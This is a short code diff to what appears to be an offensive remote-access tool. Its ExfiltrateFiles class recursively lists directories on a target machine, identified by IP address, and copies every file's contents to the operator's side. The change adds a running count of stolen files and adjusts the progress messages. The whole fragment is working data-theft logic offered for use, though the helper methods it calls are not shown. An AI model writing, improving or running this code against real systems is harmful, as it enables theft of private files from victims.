@@ -8,17 +8,22 @@ from wrappers.list_dir_info import ListPathInfo
 
 
 class ExfiltrateFiles(BaseCommand):
+    def __init__(self, ip: str):
+        super().__init__(ip)
+        self.files_exfiltrated = 0
 
     def execute(self, path: str) -> None:
         for file in ListPathInfo(self.ip).execute(path):
             full_path = Path(path) / file.name
 
             if file.is_dir:
-                print(f"Folder: {full_path}")
+                print(f"[\t] Folder: {full_path}")
 
                 self.execute(full_path.as_posix())
             else:
-                print(f"File: {full_path}")
+                self.files_exfiltrated += 1
+                print(f"[{self.files_exfiltrated}\t] File: {full_path}")
+
                 contents = self._exfiltrate_file_content(full_path.as_posix())
                 self._write_to_file(str(full_path), contents)
 
